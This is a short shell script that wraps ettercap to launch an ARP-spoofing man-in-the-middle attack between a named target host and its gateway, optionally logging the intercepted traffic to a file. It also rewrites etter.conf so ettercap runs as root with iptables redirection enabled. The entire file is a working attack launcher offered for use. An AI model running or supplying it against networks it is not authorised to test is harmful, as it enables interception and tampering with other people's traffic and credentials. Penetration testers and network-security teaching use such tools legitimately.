#!/bin/sh
ShowUsage() {
	echo "Usage: $0 --gui or: [--target=<IP of target> --gateway=<IP of gateway or host2> [--output=<outputfile>]]"
	echo ""
	echo "$0 runs ettercap and if an output file is provided writes output to <outputfile>."
	echo ""
}

if [ $# -eq 0 ]; then
	if [ "$(id -u)" != "0" ]; then
		echo ""
		echo "IMPORTANT: This script must be run as root.  Please use sudo $0 to run."
		echo ""
	fi
	ShowUsage
	exit 1
fi

#  Must be superuser
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root.  Please use sudo $0 to run."
   exit 2
fi

ETTERCAPFILE=`which ettercap`

if [ ${#ETTERCAPFILE} -eq 0 ]; then
	echo "ERROR: Unable to find ettercap."
	exit 3
fi

CAPINTERFACE=`ifconfig | grep -Eio "^eth[0-9]" | sort | head --lines=1`
if [ ${#CAPINTERFACE} -eq 0 ]; then
	CAPINTERFACE="eth0"
fi

TARGET=""
GATEWAY=""
OUTPUTFILE=""
GUI=0

for i in $*
do
	case $i in
	--gui)
		GUI=1
	;;
    	--target=*)
		TARGET=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	--gateway=*)
		GATEWAY=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	--output=*)
		OUTPUTFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
	--help)
		ShowUsage
		exit 1
		;;
	esac
done

if [ ${#TARGET} -eq 0 -a $GUI -eq 0 ]; then
	echo "ERROR: Please provide a target host."
	exit 2
fi

if [ ${#GATEWAY} -eq 0  -a $GUI -eq 0 ]; then
	echo "ERROR: Please provide a gateway or second host."
	exit 2
fi

# Check config file
if [ -e /usr/local/etc/etter.conf ]; then
	if [ ! -e /usr/local/etc/etter.conf.bak ]; then
		cp /usr/local/etc/etter.conf /usr/local/etc/etter.conf.bak
	fi

	# Fix uid/gid
	grep -q "ec_uid = 65534" /usr/local/etc/etter.conf

	if [ $? -eq 0 ]; then
		sed -i "s/^ec_uid = 65534/ec_uid = 0/" /usr/local/etc/etter.conf
	fi

	grep -q "ec_gid = 65534" /usr/local/etc/etter.conf

	if [ $? -eq 0 ]; then
		sed -i "s/^ec_gid = 65534/ec_gid = 0/" /usr/local/etc/etter.conf
	fi

	grep -q "#redir_command_on = \"iptables" /usr/local/etc/etter.conf

	if [ $? -eq 0 ]; then
		sed -i "s/#redir_command_on = \"iptables/redir_command_on = \"iptables/" /usr/local/etc/etter.conf
	fi

	grep -q "#redir_command_off = \"iptables" /usr/local/etc/etter.conf

	if [ $? -eq 0 ]; then
		sed -i "s/#redir_command_off = \"iptables/redir_command_off = \"iptables/" /usr/local/etc/etter.conf
	fi
fi

if [ $GUI -eq 1 ]; then
	ettercap -G -i $CAPINTERFACE &
else
	if [ ${#OUTPUTFILE} -eq 0 ]; then
		ettercap -T -i $CAPINTERFACE -M arp:remote /$TARGET/ /$GATEWAY/
	else
		echo "Logging output to $OUTPUTFILE.... press 'q' to quit"
		ettercap -T -i $CAPINTERFACE -M arp:remote /$TARGET/ /$GATEWAY/ > $OUTPUTFILE
	fi
fi

